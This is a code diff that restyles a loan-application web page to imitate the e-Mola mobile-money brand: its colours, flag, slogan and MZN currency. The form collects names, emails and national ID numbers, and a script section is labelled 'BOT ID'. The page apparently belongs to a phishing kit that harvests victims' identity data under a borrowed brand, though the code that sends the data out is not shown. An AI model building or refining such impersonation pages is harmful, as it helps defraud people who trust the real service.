@@ -11,57 +11,158 @@
             box-sizing: border-box;
         }
 
+        html,
+        body {
+            width: 100%;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
         body {
             font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #f0f2f5;
+            background:
+                linear-gradient(180deg, #f7a53d 0%, #e38a2e 25%, #c46b22 52%, #a94e1c 76%, #914015 100%);
             display: flex;
             justify-content: center;
             align-items: flex-start;
             min-height: 100vh;
             margin: 0;
             padding: 20px;
+            color: white;
         }
 
         .loan-container {
-            background: #ffffff;
-            border-radius: 24px;
             width: 100%;
-            max-width: 400px;
-            padding: 0 28px 32px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+            max-width: 709px;
+            background: transparent;
+            border-radius: 0;
+            padding: 0;
+            box-shadow: none;
             overflow: hidden;
             position: relative;
             margin-top: 20px;
         }
 
+        /* Soft background shape (same as details) */
+        .loan-container::after {
+            content: "";
+            position: absolute;
+            width: 680px;
+            height: 900px;
+            left: 50%;
+            top: 200px;
+            transform: translateX(-50%) rotate(-7deg);
+            background: radial-gradient(ellipse at 45% 30%, rgba(255, 183, 83, 0.28) 0%, rgba(224, 127, 38, 0.18) 35%, rgba(112, 49, 12, 0.12) 70%, transparent 75%);
+            border-radius: 45% 55% 50% 45%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* Back arrow (optional, but matches) */
+        .loan-container::before {
+            content: "";
+            position: absolute;
+            top: 87px;
+            left: 62px;
+            width: 22px;
+            height: 22px;
+            border-left: 4px solid #ffffff;
+            border-bottom: 4px solid #ffffff;
+            transform: rotate(45deg);
+            z-index: 20;
+        }
+
+        /* Language selector (matches details) */
+        .language {
+            position: absolute;
+            top: 83px;
+            right: 54px;
+            display: flex;
+            align-items: center;
+            gap: 13px;
+            z-index: 20;
+            color: #ffffff;
+            font-size: 25px;
+            font-weight: 700;
+        }
+
+        .flag {
+            width: 62px;
+            height: 42px;
+            display: flex;
+            overflow: hidden;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
+        }
+
+        .flag-green {
+            width: 40%;
+            background: #006600;
+        }
+        .flag-red {
+            width: 60%;
+            background: #ff0000;
+        }
+        .flag-circle {
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            margin-left: 17px;
+            margin-top: 12px;
+            border-radius: 50%;
+            background: #ffcc00;
+            border: 2px solid #ffffff;
+        }
+
+        /* Logo (same as details) */
         .logo-container {
-            background: #6a0dad;
-            margin: 0 -28px 24px;
-            padding: 28px 20px 18px;
+            position: relative;
+            z-index: 5;
             text-align: center;
+            margin: 80px 0 30px;
+        }
+
+        .logo-container::before {
+            content: "▣";
+            display: block;
+            font-size: 95px;
+            line-height: 75px;
+            font-weight: 900;
             color: white;
-            border-bottom: 4px solid #5a0b9a;
+            margin-bottom: 8px;
+            transform: rotate(-4deg);
         }
 
         .logo-container h1 {
-            font-size: 32px;
+            font-size: 67px;
+            line-height: 1;
             font-weight: 700;
-            letter-spacing: 1px;
-            margin-bottom: 2px;
+            letter-spacing: -2px;
+            margin: 0 0 5px;
+            color: #ffffff;
         }
 
         .logo-container .slogan {
-            font-size: 14px;
-            font-weight: 300;
-            opacity: 0.9;
-            letter-spacing: 0.5px;
+            font-size: 21px;
+            line-height: 1.1;
+            font-weight: 700;
+            color: #ffffff;
         }
 
+        /* White card for calculator and form */
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 24px;
+            padding: 24px 20px;
+            margin: 20px 0 30px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+            position: relative;
+            z-index: 10;
+            color: #333;
+        }
+
+        /* Calculator box (inside card) */
         .calculator-box {
-            background: #f8f0ff;
-            padding: 20px 16px;
-            border-radius: 18px;
-            margin-bottom: 20px;
+            padding: 0;
         }
 
         .calculator-box h2 {
@@ -154,9 +255,9 @@
             background: #5a0b9a;
         }
 
+        /* Form section (hidden initially) */
         .form-section {
             display: none;
-            margin-top: 10px;
         }
 
         .form-section label {
@@ -194,6 +295,7 @@
             font-size: 14px;
             line-height: 1.6;
             margin: 18px 0 16px;
+            color: #333;
         }
 
         .form-section .loan-notice strong {
@@ -229,43 +331,80 @@
             background: #5a0b9a;
         }
 
+        /* Footer links (white on orange) */
         .footer-links {
             display: flex;
             justify-content: space-between;
-            margin-top: 24px;
-            font-size: 14px;
+            margin: 30px 0 20px;
+            font-size: 20px;
+            position: relative;
+            z-index: 10;
         }
 
         .footer-links a {
-            color: #6a0dad;
+            color: #ffffff;
             text-decoration: none;
-            font-weight: 500;
-            transition: color 0.2s;
+            font-weight: 400;
+            transition: opacity 0.2s;
         }
 
         .footer-links a:hover {
-            color: #4a0a7a;
-            text-decoration: underline;
+            opacity: 0.8;
+            text-decoration: none;
         }
 
+        /* Version */
         .version {
             text-align: center;
-            font-size: 12px;
-            color: #999;
-            margin-top: 18px;
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.65);
+            margin: 10px 0 30px;
             letter-spacing: 0.3px;
+            position: relative;
+            z-index: 10;
         }
 
-        @media (max-width: 420px) {
-            .loan-container {
-                padding: 0 20px 28px;
+        @media (max-width: 480px) {
+            .loan-container::before {
+                top: 91px;
+                left: 59px;
+                width: 19px;
+                height: 19px;
+                border-width: 4px;
+            }
+            .language {
+                top: 84px;
+                right: 28px;
+                gap: 9px;
+                font-size: 21px;
+            }
+            .flag {
+                width: 55px;
+                height: 36px;
+            }
+            .flag-circle {
+                width: 15px;
+                height: 15px;
+                margin-left: 15px;
+                margin-top: 10px;
             }
             .logo-container {
-                margin: 0 -20px 20px;
-                padding: 24px 16px 16px;
+                margin-top: 60px;
+            }
+            .logo-container::before {
+                font-size: 80px;
+                line-height: 66px;
             }
             .logo-container h1 {
-                font-size: 28px;
+                font-size: 58px;
+                letter-spacing: -2px;
+            }
+            .logo-container .slogan {
+                font-size: 19px;
+            }
+            .card {
+                padding: 20px 16px;
+                margin: 10px 0 20px;
             }
             .loan-amount {
                 font-size: 28px;
@@ -273,99 +412,174 @@
             .term-buttons {
                 grid-template-columns: repeat(2, 1fr);
             }
+            .footer-links {
+                font-size: 17px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .loan-container::before {
+                top: 65px;
+                left: 30px;
+                width: 17px;
+                height: 17px;
+            }
+            .language {
+                top: 62px;
+                right: 20px;
+                font-size: 18px;
+            }
+            .flag {
+                width: 48px;
+                height: 31px;
+            }
+            .logo-container {
+                margin-top: 50px;
+            }
+            .logo-container::before {
+                font-size: 70px;
+            }
+            .logo-container h1 {
+                font-size: 50px;
+            }
+            .logo-container .slogan {
+                font-size: 17px;
+            }
+            .footer-links {
+                font-size: 15px;
+                flex-direction: column;
+                align-items: center;
+                gap: 10px;
+            }
+        }
+
+        @media (max-height: 700px) {
+            .logo-container {
+                margin-top: 40px;
+            }
+            .logo-container::before {
+                font-size: 70px;
+                line-height: 55px;
+            }
+            .logo-container h1 {
+                font-size: 50px;
+            }
+            .card {
+                padding: 16px 14px;
+            }
         }
     </style>
 </head>
 <body>
 
 <div class="loan-container">
+
+    <!-- Language selector -->
+    <div class="language">
+        <div class="flag">
+            <div class="flag-green"></div>
+            <div class="flag-red"></div>
+            <div class="flag-circle"></div>
+        </div>
+        <span>POR</span>
+    </div>
+
+    <!-- Logo (e-Mola style) -->
     <div class="logo-container">
-        <h1>e‑Mola</h1>
+        <h1>e-Mola</h1>
         <div class="slogan">Meu cell, minha mola</div>
     </div>
 
-    <!-- CALCULATOR -->
-    <div id="calculatorSection">
-        <div class="calculator-box">
-            <h2>Simulador de Empréstimo</h2>
-            <p style="font-weight:500; color:#333;">Valor do Empréstimo</p>
-            <div class="loan-amount" id="amountDisplay">USD 15,400</div>
-            <input type="range" min="100" max="100000" value="15400" class="slider" id="loanSlider" />
-            <div class="range-values">
-                <span>USD 100</span>
-                <span>USD 100,000</span>
+    <!-- White card containing calculator + form -->
+    <div class="card">
+
+        <!-- CALCULATOR SECTION -->
+        <div id="calculatorSection">
+            <div class="calculator-box">
+                <h2>Simulador de Empréstimo</h2>
+                <p style="font-weight:500; color:#333;">Valor do Empréstimo</p>
+                <div class="loan-amount" id="amountDisplay">MZN 15,400</div>
+                <input type="range" min="100" max="100000" value="15400" class="slider" id="loanSlider" />
+                <div class="range-values">
+                    <span>MZN 100</span>
+                    <span>MZN 100,000</span>
+                </div>
+                <h3 style="color:#6a0dad; margin-top:18px; font-size:16px;">Prazo do Empréstimo</h3>
+                <div class="term-buttons">
+                    <button type="button" class="term-btn" data-months="6">6 meses</button>
+                    <button type="button" class="term-btn active" data-months="12">12 meses</button>
+                    <button type="button" class="term-btn" data-months="24">24 meses</button>
+                    <button type="button" class="term-btn" data-months="36">36 meses</button>
+                    <button type="button" class="term-btn" data-months="48">48 meses</button>
+                    <button type="button" class="term-btn" data-months="60">60 meses</button>
+                </div>
+                <div class="payment-box">
+                    <p>Pagamento Mensal Estimado</p>
+                    <h2 id="monthlyPayment">MZN 1,314.83</h2>
+                </div>
+                <button class="apply-btn" onclick="showForm()">Solicitar Agora</button>
             </div>
-            <h3 style="color:#6a0dad; margin-top:18px; font-size:16px;">Prazo do Empréstimo</h3>
-            <div class="term-buttons">
-                <button type="button" class="term-btn" data-months="6">6 meses</button>
-                <button type="button" class="term-btn active" data-months="12">12 meses</button>
-                <button type="button" class="term-btn" data-months="24">24 meses</button>
-                <button type="button" class="term-btn" data-months="36">36 meses</button>
-                <button type="button" class="term-btn" data-months="48">48 meses</button>
-                <button type="button" class="term-btn" data-months="60">60 meses</button>
-            </div>
-            <div class="payment-box">
-                <p>Pagamento Mensal Estimado</p>
-                <h2 id="monthlyPayment">USD 1,314.83</h2>
-            </div>
-            <button class="apply-btn" onclick="showForm()">Solicitar Agora</button>
         </div>
-    </div>
 
-    <!-- FORM -->
-    <div class="form-section" id="formSection">
-        <form id="loanForm">
-            <label>Nome Completo</label>
-            <input id="fullName" type="text" required placeholder="Digite seu nome completo" />
+        <!-- APPLICATION FORM (hidden initially) -->
+        <div class="form-section" id="formSection">
+            <form id="loanForm">
+                <label>Nome Completo</label>
+                <input id="fullName" type="text" required placeholder="Digite seu nome completo" />
 
-            <label>Valor do Empréstimo (USD)</label>
-            <input id="loanAmount" type="number" required placeholder="Mínimo 50" />
+                <label>Valor do Empréstimo (MZN)</label>
+                <input id="loanAmount" type="number" required placeholder="Mínimo 50" />
 
-            <label>Endereço de Email</label>
-            <input id="email" type="email" placeholder="exemplo@gmail.com" required />
+                <label>Endereço de Email</label>
+                <input id="email" type="email" placeholder="exemplo@gmail.com" required />
 
-            <label>Número do Documento de Identidade</label>
-            <input id="nationalId" type="text" placeholder="Digite o seu BI / NIF" />
+                <label>Número do Documento de Identidade</label>
+                <input id="nationalId" type="text" placeholder="Digite o seu BI / NIF" />
 
-            <label>Situação Profissional</label>
-            <select id="employmentStatus" required>
-                <option value="">Selecionar</option>
-                <option value="employed">Empregado</option>
-                <option value="self-employed">Trabalhador por conta própria</option>
-                <option value="unemployed">Desempregado</option>
-                <option value="student">Estudante</option>
-            </select>
+                <label>Situação Profissional</label>
+                <select id="employmentStatus" required>
+                    <option value="">Selecionar</option>
+                    <option value="employed">Empregado</option>
+                    <option value="self-employed">Trabalhador por conta própria</option>
+                    <option value="unemployed">Desempregado</option>
+                    <option value="student">Estudante</option>
+                </select>
 
-            <label>Finalidade do Empréstimo</label>
-            <select id="loanPurpose" required>
-                <option value="">Selecionar</option>
-                <option value="business">Negócio</option>
-                <option value="personal">Despesas Pessoais</option>
-                <option value="schoolfees">Propinas Escolares</option>
-                <option value="medical">Despesas Médicas</option>
-                <option value="others">Outros</option>
-            </select>
+                <label>Finalidade do Empréstimo</label>
+                <select id="loanPurpose" required>
+                    <option value="">Selecionar</option>
+                    <option value="business">Negócio</option>
+                    <option value="personal">Despesas Pessoais</option>
+                    <option value="schoolfees">Propinas Escolares</option>
+                    <option value="medical">Despesas Médicas</option>
+                    <option value="others">Outros</option>
+                </select>
 
-            <div class="loan-notice">
-                <strong>Aviso sobre o Pedido de Empréstimo:</strong>
-                <ol>
-                    <li>Certifique-se de que todas as informações fornecidas estão corretas.</li>
-                    <li>A aprovação depende da análise de elegibilidade.</li>
-                    <li>Os termos e condições de reembolso aplicam-se.</li>
-                </ol>
-            </div>
+                <div class="loan-notice">
+                    <strong>Aviso sobre o Pedido de Empréstimo:</strong>
+                    <ol>
+                        <li>Certifique-se de que todas as informações fornecidas estão corretas.</li>
+                        <li>A aprovação depende da análise de elegibilidade.</li>
+                        <li>Os termos e condições de reembolso aplicam-se.</li>
+                    </ol>
+                </div>
 
-            <button type="submit">Continuar</button>
-        </form>
-    </div>
+                <button type="submit">Continuar</button>
+            </form>
+        </div>
 
+    </div> <!-- end card -->
+
+    <!-- Footer links (white on orange) -->
     <div class="footer-links">
         <a href="#" onclick="alert('Redirecionar para recuperação')">Esqueceu a senha</a>
         <a href="#" onclick="alert('Redirecionar para cadastro')">Cadastrar-se</a>
     </div>
 
+    <!-- Version -->
     <div class="version">Versão 2.1.0</div>
-</div>
+
+</div> <!-- end loan-container -->
 
 <script>
     // ---------- BOT ID ----------
@@ -408,9 +622,9 @@
 
     function updatePayment() {
         const amount = parseInt(slider.value);
-        amountDisplay.innerText = 'USD ' + amount.toLocaleString();
+        amountDisplay.innerText = 'MZN ' + amount.toLocaleString();
         const payment = (amount / selectedMonths).toFixed(2);
-        monthlyPayment.innerText = 'USD ' + payment;
+        monthlyPayment.innerText = 'MZN ' + payment;
     }
 
     slider.addEventListener('input', updatePayment);
